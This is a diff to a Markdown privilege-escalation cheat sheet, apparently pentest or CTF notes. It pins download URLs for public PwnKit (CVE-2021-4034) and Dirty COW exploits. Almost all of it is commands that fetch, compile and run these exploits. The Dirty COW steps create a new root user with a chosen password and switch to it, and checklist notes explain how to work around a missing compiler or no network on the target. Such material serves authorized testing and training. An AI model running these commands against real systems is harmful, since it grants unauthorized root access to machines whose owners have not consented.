@@ -41,14 +41,14 @@ chmod +x exploit
 - [ ] GLIBC_2.34 not found from a Kali build: -static, or built on a release as old as the target's
 
 ## PwnKit
-wget https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c
+wget https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/4289592a4603a1ee62d3d5b39a4e3b958453887a/cve-2021-4034-poc.c
 gcc cve-2021-4034-poc.c -o pwnkit
 ./pwnkit
 - [ ] This PoC calls gcc on the target as it runs: with no gcc there, a static build such as ly4k's PwnKit
 - [ ] No network on the target: the file fetched on Kali, into the target's upload/ folder for serve
 
 ## Dirty COW, a new root user
-wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
+wget https://raw.githubusercontent.com/firefart/dirtycow/75242ef4a92b02e6ea0e6062147d62632fdeca1b/dirty.c
 gcc -pthread dirty.c -o dirty -lcrypt
 ./dirty 'Pwned123!'
 su firefart
